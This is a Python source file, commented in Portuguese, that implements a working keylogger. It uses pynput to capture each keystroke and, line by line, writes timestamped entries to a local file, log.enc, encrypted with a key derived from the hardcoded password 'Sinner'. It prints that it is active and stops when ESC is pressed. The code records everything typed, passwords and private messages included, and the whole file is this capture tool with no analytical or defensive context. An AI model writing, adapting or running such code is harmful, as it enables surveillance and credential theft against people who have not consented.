from pynput import keyboard
from cryptography.fernet import Fernet
import base64, hashlib
from datetime import datetime
import os
import sys

def iniciar_keylogger():
    senha = "Sinner"
    chave = base64.urlsafe_b64encode(hashlib.sha256(senha.encode()).digest())
    cipher = Fernet(chave)
    buffer = ""
    active = True  # Flag para controlar o estado do keylogger

    def on_press(key):
        nonlocal buffer, active
        
        if not active:
            return False  # Para de capturar teclas se não estiver ativo

        try:
            if key == keyboard.Key.esc:
                print("\n[!] Keylogger sendo encerrado...")
                active = False
                if buffer.strip():
                    salvar_linha(buffer)
                # Força a saída do programa para evitar captura de teclas do menu
                os._exit(0)
                return False

            # Processamento normal das teclas
            try:
                buffer += key.char
            except AttributeError:
                if key == keyboard.Key.space:
                    buffer += ' '
                elif key == keyboard.Key.enter:
                    buffer += '\n'
                    salvar_linha(buffer)
                    buffer = ""
                elif key == keyboard.Key.backspace:
                    buffer = buffer[:-1] if buffer else ""
                elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.alt):
                    pass
                else:
                    buffer += f"[{key.name}]"

        except Exception as e:
            print(f"[ERRO] Erro ao processar tecla: {e}")

    def salvar_linha(texto):
        try:
            if not texto.strip():
                return
                
            linha = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {texto.strip()}"
            with open("log.enc", "ab") as f:
                encrypted = cipher.encrypt(linha.encode('utf-8'))
                f.write(encrypted + b'\n')
        except Exception as e:
            print(f"[ERRO] Falha ao salvar linha: {e}")

    print("\n[+] Keylogger ativo. Pressione ESC para parar.")
    print("[!] Atenção: O programa será totalmente encerrado ao pressionar ESC.")
    
    # Configura o listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    try:
        while active:
            pass  # Mantém o keylogger rodando
    except KeyboardInterrupt:
        pass
    finally:
        if buffer.strip():
            salvar_linha(buffer)
        listener.stop()